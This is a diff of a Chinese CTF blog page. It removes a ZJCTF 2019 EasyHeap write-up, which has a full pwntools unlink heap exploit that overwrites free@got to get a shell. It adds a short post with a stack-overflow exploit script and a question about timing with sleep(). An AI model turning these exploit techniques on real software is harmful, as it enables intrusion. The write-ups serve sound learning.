@@ -16,27 +16,23 @@
   <meta name="author" content="Isolator">
   <meta name="keywords" content="">
   
-    <meta name="description" content="unlink 漏洞例题">
+    <meta name="description" content="解决或未解决的奇怪问题">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ZJCTF 2019 EasyHeap">
-<meta property="og:url" content="https://isolator-1.github.io/2022/11/29/[ZJCTF%202019]EasyHeap/index.html">
+<meta property="og:title" content="遇到的奇奇怪怪问题汇总">
+<meta property="og:url" content="https://isolator-1.github.io/2022/11/29/%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/index.html">
 <meta property="og:site_name" content="Isolator&#39;s Blog">
-<meta property="og:description" content="unlink 漏洞例题">
+<meta property="og:description" content="解决或未解决的奇怪问题">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://isolator-1.github.io/img/%5BZJCTF2019%5DEasyHeap/1.jpg">
-<meta property="og:image" content="https://isolator-1.github.io/img/%5BZJCTF2019%5DEasyHeap/2.jpg">
-<meta property="og:image" content="https://isolator-1.github.io/img/%5BZJCTF2019%5DEasyHeap/3.jpg">
-<meta property="article:published_time" content="2022-11-29T07:09:00.000Z">
-<meta property="article:modified_time" content="2022-11-29T07:51:29.346Z">
+<meta property="article:published_time" content="2022-11-29T13:35:00.000Z">
+<meta property="article:modified_time" content="2022-11-29T13:50:54.713Z">
 <meta property="article:author" content="Isolator">
 <meta property="article:tag" content="ctf-pwn">
-<meta property="article:tag" content="exp">
+<meta property="article:tag" content="Others">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://isolator-1.github.io/img/%5BZJCTF2019%5DEasyHeap/1.jpg">
   
   
   
-  <title>ZJCTF 2019 EasyHeap - Isolator&#39;s Blog</title>
+  <title>遇到的奇奇怪怪问题汇总 - Isolator&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -201,7 +197,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="ZJCTF 2019 EasyHeap"></span>
+            <span id="subtitle" data-typed-text="遇到的奇奇怪怪问题汇总"></span>
           
         </div>
 
@@ -212,7 +208,7 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-11-29 15:09" pubdate>
+        <time datetime="2022-11-29 21:35" pubdate>
           November 29, 2022 pm
         </time>
       </span>
@@ -224,7 +220,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.2k words
+          461 words
         
       </span>
     
@@ -235,7 +231,7 @@
         
         
         
-          19 mins
+          4 mins
         
       </span>
     
@@ -273,48 +269,21 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">ZJCTF 2019 EasyHeap</h1>
+            <h1 style="display: none">遇到的奇奇怪怪问题汇总</h1>
             
             
               <div class="markdown-body">
                 
-                <h4 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h4><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap">https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap</a></p>
-<h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><p>很明显在<code>ceate_heap</code>中size并没有存下来，然后<code>edit_heap</code>时也是用户自己输入size来编辑</p>
-<p>因此可以溢出</p>
-<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>checksec发现没有开启PIE，heaparray的地址可以直接使用</p>
-<ol>
-<li><p>首先申请三个chunk</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>)<br></code></pre></td></tr></table></figure></li>
-<li><p>构造一个unlink需要在第一个chunk内构造一个fakechunk</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">fake_chunk = p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>) + p64(heaparray_addr-<span class="hljs-number">0x18</span>) + p64(heaparray_addr-<span class="hljs-number">0x10</span>)<br>fake_chunk = fake_chunk.ljust(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&#x27;M&#x27;</span>)<br>fake_chunk += p64(<span class="hljs-number">0x90</span>) + p64(<span class="hljs-number">0xa0</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>,fake_chunk)<br></code></pre></td></tr></table></figure>
+                <h4 id="sleep-？"><a href="#sleep-？" class="headerlink" title="sleep ？"></a>sleep ？</h4><p>题目：</p>
+<p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#mrctf2020_easyrop">https://buuoj.cn/challenges#mrctf2020_easyrop</a></p>
+<p>本来是很简单的一个溢出</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-comment">#r = process(&#x27;./mrctf2020_easyrop&#x27;)</span><br>r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25663</span>)<br>system_sh =<span class="hljs-number">0x000000000040072A</span><br>r.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br><span class="hljs-comment">#sleep(1)</span><br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x300</span>)<br>r.sendline(<span class="hljs-string">b&#x27;7&#x27;</span>)<br><span class="hljs-comment">#sleep(1)</span><br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>* <span class="hljs-number">0x12</span> + p64(system_sh))<br>r.interactive()<br></code></pre></td></tr></table></figure>
 
-<p><img src="/img/%5BZJCTF2019%5DEasyHeap/1.jpg" srcset="/img/loading.gif" lazyload></p>
-<p>对于chunk 0，<code>fd = heaparray - 0x18</code> <code>bk = heaparray - 0x10</code>，unlink chunk 0 时会将heaparray[0]指向<code>heaparray - 0x18</code></p>
-</li>
-<li><p>这时delete(1)，会将chunk 1 和 fakechunk 合并起来放入 unsorted bin</p>
-<p><img src="/img/%5BZJCTF2019%5DEasyHeap/2.jpg" srcset="/img/loading.gif" lazyload></p>
-<p>查看heaparray地址上的值：</p>
-<p><img src="/img/%5BZJCTF2019%5DEasyHeap/3.jpg" srcset="/img/loading.gif" lazyload></p>
-<p>说明fakechunk成功完成unlink操作，heaparray[0]指向了0x6020c8</p>
-</li>
-<li><p>这时edit(0)会从0x6020c8这个地址开始写，因此</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> +p64(free_got)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span> ,payload)<br></code></pre></td></tr></table></figure>
-
-<p>又一次覆盖了heaparray[0]，指向了<code>free@got</code></p>
-</li>
-<li><p>这时edit(0)会修改<code>free@got</code>的内容</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(system_plt))<br></code></pre></td></tr></table></figure>
-
-<p>将其函数改为system函数的plt表</p>
-<blockquote>
-<p>因为system没有被调用过，不能直接改成system@got</p>
-</blockquote>
-</li>
-<li><p>delete(2)会调用free(“/bin/sh”)，而free函数被替换成了system，因此得到了shell</p>
-</li>
-</ol>
-<h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27679</span>)<br>elf = ELF(<span class="hljs-string">&quot;./easyheap&quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;Size of Heap : &quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(size))<br>    r.recvuntil(<span class="hljs-string">&quot;Content of heap:&quot;</span>)<br>    r.sendline(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, size, content</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br>    r.recvuntil(<span class="hljs-string">&quot;Size of Heap : &quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(size))<br>    r.recvuntil(<span class="hljs-string">&quot;Content of heap : &quot;</span>)<br>    r.sendline(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>heaparray_addr = <span class="hljs-number">0x6020E0</span><br>system_plt = elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br>add(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br><br>fake_chunk = p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>) + p64(heaparray_addr-<span class="hljs-number">0x18</span>) + p64(heaparray_addr-<span class="hljs-number">0x10</span>)<br>fake_chunk = fake_chunk.ljust(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&#x27;M&#x27;</span>)<br>fake_chunk += p64(<span class="hljs-number">0x90</span>) + p64(<span class="hljs-number">0xa0</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>,fake_chunk)<br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> +p64(free_got)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span> ,payload)<br><span class="hljs-comment">#gdb.attach(r)</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(system_plt))<br>delete(<span class="hljs-number">2</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure>
-
+<p>但是不加sleep无法通过</p>
+<p>有人说是python同时发送多个字符串时会合并(?)</p>
+<p>那什么时候情况下需要在sendline前面加一个sleep</p>
+<p>尚待解决</p>
+<hr>
 
                 
               </div>
@@ -329,7 +298,7 @@
       
         <a href="/tags/ctf-pwn/">#ctf-pwn</a>
       
-        <a href="/tags/exp/">#exp</a>
+        <a href="/tags/Others/">#Others</a>
       
     </div>
   
@@ -341,8 +310,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>ZJCTF 2019 EasyHeap</div>
-      <div>https://isolator-1.github.io/2022/11/29/[ZJCTF 2019]EasyHeap/</div>
+      <div>遇到的奇奇怪怪问题汇总</div>
+      <div>https://isolator-1.github.io/2022/11/29/遇到的奇奇怪怪问题汇总/</div>
     </div>
     <div class="license-meta">
       
@@ -386,18 +355,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/11/29/%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/" title="遇到的奇奇怪怪问题汇总">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">遇到的奇奇怪怪问题汇总</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/11/27/Off-By-One/" title="Off-By-One">
-                        <span class="hidden-mobile">Off-By-One</span>
+                      <a href="/2022/11/29/%5BZJCTF%202019%5DEasyHeap/" title="ZJCTF 2019 EasyHeap">
+                        <span class="hidden-mobile">ZJCTF 2019 EasyHeap</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
